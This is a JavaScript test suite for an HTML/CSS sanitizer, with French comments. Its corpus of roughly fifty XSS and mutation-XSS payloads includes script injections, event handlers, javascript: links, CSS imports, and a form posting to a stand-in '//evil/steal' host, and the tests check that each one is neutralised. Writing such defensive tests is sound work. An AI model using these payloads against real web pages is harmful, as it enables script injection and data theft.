// tests/sanitizer.test.mjs — Tests de l'assainisseur HTML/CSS d'IRP (node:test + jsdom)
// Usage : cd tests && npm install && npm test
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { JSDOM } from 'jsdom';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const here = path.dirname(fileURLToPath(import.meta.url));
const repo = path.join(here, '..');
const SRC = fs.readFileSync(path.join(repo, 'irp-sdk', 'irp-sanitizer.js'), 'utf8');

const dom = new JSDOM('<!doctype html><html><body></body></html>', { runScripts: 'outside-only' });
dom.window.eval(SRC);
const S = dom.window.IRPSanitizer;
const doc = dom.window.document;
const HTML_NS = 'http://www.w3.org/1999/xhtml';
const BS = String.fromCharCode(92); // antislash

const render = (html) => {
  const box = doc.createElement('div');
  box.appendChild(S.sanitizeToFragment(html, doc));
  return box;
};
const noSpace = (s) => Array.from(s).filter((c) => c.charCodeAt(0) > 32).join('').toLowerCase();

const FORBIDDEN_TAGS = ['script', 'iframe', 'frame', 'frameset', 'object', 'embed', 'applet', 'link', 'meta',
  'base', 'template', 'noscript', 'math', 'foreignobject', 'audio', 'video', 'source', 'canvas', 'use',
  'animate', 'set', 'head'];

function assertCssSafe(css, label) {
  assert.ok(!/@import|@font-face|expression\s*\(|javascript\s*:|-moz-binding|behavior\s*:/i.test(css), `${label}: CSS dangereux`);
  const re = /url\s*\(\s*["']?([^"')]*)/gi;
  let m;
  while ((m = re.exec(css))) {
    const arg = noSpace(m[1]);
    assert.ok(arg[0] === '#' || arg.startsWith('data:image/'), `${label}: url() externe "${m[1]}"`);
  }
}

// Invariants de sécurité sur un arbre DOM déjà assaini
function assertSafe(box, label = '') {
  for (const el of box.querySelectorAll('*')) {
    const tag = el.localName.toLowerCase();
    assert.ok(!FORBIDDEN_TAGS.includes(tag), `${label}: balise interdite <${tag}>`);
    assert.ok(!(tag === 'title' && el.namespaceURI === HTML_NS), `${label}: <title> HTML`);
    for (const a of Array.from(el.attributes)) {
      const n = a.name.toLowerCase();
      const v = noSpace(a.value);
      assert.ok(!n.startsWith('on'), `${label}: handler ${n}`);
      assert.ok(!['srcdoc', 'formaction', 'xlink:href', 'srcset', 'background', 'ping'].includes(n), `${label}: attribut ${n}`);
      if (n === 'href') assert.ok(!/^(javascript|vbscript|data):/.test(v), `${label}: href ${a.value}`);
      if (n === 'src') assert.ok(!/^(https?:|\/\/|javascript:|vbscript:|data:(?!image\/))/.test(v), `${label}: src ${a.value}`);
      if (n === 'action') assert.ok(!/^([a-z][a-z0-9+.-]*:|\/\/)/.test(v), `${label}: action ${a.value}`);
      if (n === 'style') assertCssSafe(a.value, `${label} style=`);
    }
    if (el.localName === 'style') assertCssSafe(el.textContent, `${label} <style>`);
  }
}

// ─── Charges d'attaque ───────────────────────────────────────────────────────

const CORPUS = [
  '<script>alert(1)</script>',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '<img src="x" onerror="alert(1)">',
  '<img src=x onerror=alert(1)//',
  '<svg/onload=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  '<svg><animate attributeName=href values=javascript:alert(1) /><a id=x><text x=20 y=20>XSS</text></a></svg>',
  '<svg><set attributeName=onmouseover to=alert(1) /></svg>',
  '<svg><use href="data:image/svg+xml,&lt;svg id=x&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;#x"/></svg>',
  '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
  '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
  '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<template><script>alert(1)</script></template>',
  '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>',
  '<a href="javascript:alert(1)">x</a>',
  '<a href="&#106;avascript:alert(1)">x</a>',
  '<a href="jAvAsCrIpT&colon;alert(1)">x</a>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<object data="javascript:alert(1)"></object>',
  '<embed src="javascript:alert(1)">',
  '<link rel="stylesheet" href="//evil/x.css">',
  '<meta http-equiv="refresh" content="0;url=//evil">',
  '<base href="//evil/">',
  '<form action="//evil/steal"><input name=a><button formaction="//evil">go</button></form>',
  '<button formaction=javascript:alert(1)>x</button>',
  '<input onfocus=alert(1) autofocus>',
  '<details open ontoggle=alert(1)>',
  '<body onload=alert(1)>',
  '<style>@import "//evil/x.css";</style>',
  '<style>div{background:url(//evil/x.png)}</style>',
  '<style>div{background:' + BS + '75rl(http://evil/x)}</style>',
  '<style>@' + BS + '69mport "//evil/x.css";</style>',
  '<div style="background:url(javascript:alert(1))">',
  '<div style="width:expression(alert(1))">',
  '<div style="behavior:url(x.htc)">',
  '<p style="background:&#117;rl(//evil/x)">',
  '<x-custom onclick=alert(1)>c</x-custom>',
  '<video><source onerror=alert(1)></video>',
  '<audio src=x onerror=alert(1)>',
  '<textarea><script>alert(1)</script></textarea>',
  '<xmp><script>alert(1)</script></xmp>',
  '<img srcset="//evil/x.png 1x" src="//evil/x.png">',
  '<svg><foreignObject><iframe src="//evil"></iframe></foreignObject></svg>',
  '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
  '<!--><img src=x onerror=alert(1)>-->',
  '<![CDATA[<img src=x onerror=alert(1)>]]>',
  '<a href="java&#x09;script:alert(1)">x</a>',
  '<a href="java&#x0A;script:alert(1)">x</a>',
  '<a href="  javascript:alert(1)">x</a>',
  '<a href="data:text/html,<script>alert(1)</script>">x</a>',
];

test(`corpus d'attaque (${CORPUS.length} charges) : arbre sûr, avant et après re-sérialisation`, () => {
  for (const payload of CORPUS) {
    assertSafe(render(payload), payload);
    // défense en profondeur : même la version chaîne, re-parsée par le navigateur, reste sûre
    assertSafe(render(S.sanitizeHTML(payload, doc)), `re-parse ${payload}`);
  }
});

// ─── Comportements ciblés ────────────────────────────────────────────────────

test('scripts, handlers (quotés ou non), iframes et objets disparaissent', () => {
  const box = render('<p onclick="x()">a</p><script>alert(1)</script><img src=x onerror=alert(1)>' +
    '<svg onload=alert(1)><circle r="5"/></svg><iframe src="//evil"></iframe><object data="x"></object>');
  assert.equal(box.querySelector('script'), null);
  assert.equal(box.querySelector('iframe'), null);
  assert.equal(box.querySelector('object'), null);
  assert.ok(box.querySelector('p'), 'le texte légitime reste');
  assert.ok(box.querySelector('circle'), 'le SVG légitime reste');
  assert.ok(!/onclick|onerror|onload/i.test(box.innerHTML));
});

test('liens : schémas dangereux retirés, liens légitimes conservés', () => {
  const bad = ['javascript:alert(1)', ' JaVaScRiPt:alert(1)', 'java&#x09;script:alert(1)', 'jav&#x61;script:alert(1)',
    'data:text/html,hello', 'vbscript:msgbox(1)'];
  for (const h of bad) assert.equal(render(`<a href="${h}">x</a>`).querySelector('a').hasAttribute('href'), false, h);
  const ok = ['/pricing', '#top', 'https://example.com/x?y=1', 'mailto:a@b.c', 'tel:+33123456789', 'page.html', '?q=1'];
  for (const h of ok) assert.equal(render(`<a href="${h}">x</a>`).querySelector('a').getAttribute('href'), h, h);
  assert.equal(render('<a href="https://example.com">x</a>').querySelector('a').getAttribute('rel'), 'noopener noreferrer');
});

test('images distantes : placeholder accessible ; images locales/data: conservées', () => {
  const ext = render('<img src="https://tracker.example/p.png" alt="Logo ACME" class="hero">').firstElementChild;
  assert.equal(ext.localName, 'div');
  assert.equal(ext.getAttribute('role'), 'img');
  assert.equal(ext.getAttribute('aria-label'), 'Logo ACME');
  assert.equal(ext.getAttribute('class'), 'hero');
  assert.equal(render('<img src="//cdn.example/p.png">').firstElementChild.localName, 'div');
  assert.equal(render('<img src="data:text/html,x">').firstElementChild.localName, 'div');
  const data = render('<img src="data:image/png;base64,iVBORw0KGgo=" alt="ok">').firstElementChild;
  assert.equal(data.localName, 'img');
  assert.equal(render('<img src="/static/a.png" alt="ok">').firstElementChild.getAttribute('src'), '/static/a.png');
});

test('CSS : feuille supprimée si ressource externe ; CSS légitime conservé', () => {
  assert.equal(render('<style>@import url(//evil/x.css);</style><p>t</p>').querySelector('style'), null);
  assert.equal(render('<style>a{background:url(http://evil/x)}</style>').querySelector('style'), null);
  assert.equal(render('<style>a{background:' + BS + '75rl(http://evil/x)}</style>').querySelector('style'), null);
  assert.equal(render('<div style="background:url(javascript:alert(1))">x</div>').firstElementChild.hasAttribute('style'), false);
  const keep = render('<style>:root{--bg:#0a0a14}.card{background:var(--bg);color:#fff;border-radius:12px}' +
    '@media (max-width:600px){.card{padding:8px}}</style>').querySelector('style');
  assert.ok(keep && keep.textContent.includes('var(--bg)') && keep.textContent.includes('@media'));
  const grad = render('<svg><defs><linearGradient id="g"><stop offset="0" stop-color="#0f0"/></linearGradient></defs>' +
    '<rect width="10" height="10" fill="url(#g)"/></svg>');
  assert.equal(grad.querySelector('rect').getAttribute('fill'), 'url(#g)');
  assert.equal(render('<div style="color:red;padding:4px">x</div>').firstElementChild.getAttribute('style'), 'color:red;padding:4px');
});

test('formulaires : action externe retirée, relative conservée, type=image refusé', () => {
  assert.equal(render('<form action="https://evil/steal"><input name=a></form>').querySelector('form').hasAttribute('action'), false);
  assert.equal(render('<form action="//evil/steal"></form>').querySelector('form').hasAttribute('action'), false);
  assert.equal(render('<form action="/api/contact" method="POST"><input name=a></form>').querySelector('form').getAttribute('action'), '/api/contact');
  assert.equal(render('<input type="image" src="//evil/x.png">').querySelector('input').hasAttribute('type'), false);
});

test('SVG : <title> accessible conservé, <use>/<animate>/<foreignObject> retirés, <title> HTML retiré', () => {
  const svg = render('<svg role="img" viewBox="0 0 10 10"><title>Graphique des ventes</title><path d="M0 0L10 10"/>' +
    '<use href="https://evil/x.svg#a"/><foreignObject><p>x</p></foreignObject></svg>');
  assert.equal(svg.querySelector('svg title').textContent, 'Graphique des ventes');
  assert.equal(svg.querySelector('use'), null);
  assert.equal(svg.querySelector('foreignObject'), null);
  assert.ok(svg.querySelector('svg').hasAttribute('viewBox'), 'viewBox (sensible à la casse) préservé');
  assert.equal(render('<title>Titre HTML</title><p>t</p>').textContent, 't');
});

test('contenu légitime réaliste : structure, ARIA, data-*, table, details conservés', () => {
  const html = '<style>.hero{display:grid;gap:1rem}</style>' +
    '<main class="hero"><header><h1 id="t">Titre</h1></header>' +
    '<nav aria-label="Principal"><a href="/pricing">Tarifs</a></nav>' +
    '<section data-intent="show_pricing"><table><thead><tr><th scope="col">Plan</th></tr></thead>' +
    '<tbody><tr><td colspan="2">Pro</td></tr></tbody></table>' +
    '<details open><summary>Plus</summary><p>Détails</p></details>' +
    '<form action="/api/contact" method="post"><label for="e">Email</label>' +
    '<input id="e" type="email" name="email" required placeholder="vous@exemple.fr"><button type="submit">Envoyer</button></form>' +
    '</section></main>';
  const box = render(html);
  for (const sel of ['style', 'main.hero', 'h1#t', 'nav[aria-label="Principal"]', 'a[href="/pricing"]',
    'section[data-intent="show_pricing"]', 'th[scope="col"]', 'td[colspan="2"]', 'details[open] summary',
    'label[for="e"]', 'input[type="email"][required]', 'button[type="submit"]']) {
    assert.ok(box.querySelector(sel), `manque : ${sel}`);
  }
  assert.ok(box.textContent.includes('Détails'));
});

test('idempotence : assainir deux fois = assainir une fois', () => {
  const html = '<style>.a{color:red}</style><div class="a"><a href="/x">l</a><img src="https://e/x.png" alt="i"></div>';
  const once = S.sanitizeHTML(html, doc);
  assert.equal(S.sanitizeHTML(once, doc), once);
});

test('limites : imbrication profonde, très grosse entrée et entrées invalides ne plantent pas', () => {
  const deep = '<div>'.repeat(500) + 'x' + '</div>'.repeat(500);
  const box = render(deep);
  let depth = 0;
  for (let n = box; n.firstElementChild; n = n.firstElementChild) depth++;
  assert.ok(depth <= 65, `profondeur ${depth}`);
  assert.doesNotThrow(() => render('<span>a</span>'.repeat(30000)));
  assert.doesNotThrow(() => render('x'.repeat(3000000)));
  for (const v of [null, undefined, 42, {}, '']) assert.equal(S.sanitizeToFragment(v, doc).childNodes.length, 0);
});

test('mount() remplace le contenu de l\'élément', () => {
  const el = doc.createElement('div');
  el.innerHTML = '<p>ancien</p>';
  S.mount(el, '<h2>nouveau</h2><script>alert(1)</script>');
  assert.equal(el.innerHTML, '<h2>nouveau</h2>');
});

test('copies client/extension identiques au fichier canonique', () => {
  for (const copy of ['irp-client/sanitizer.js', 'irp-extension/irp-sanitizer.js']) {
    assert.equal(fs.readFileSync(path.join(repo, copy), 'utf8'), SRC, `${copy} diverge : lancer scripts/sync-sanitizer.sh`);
  }
});
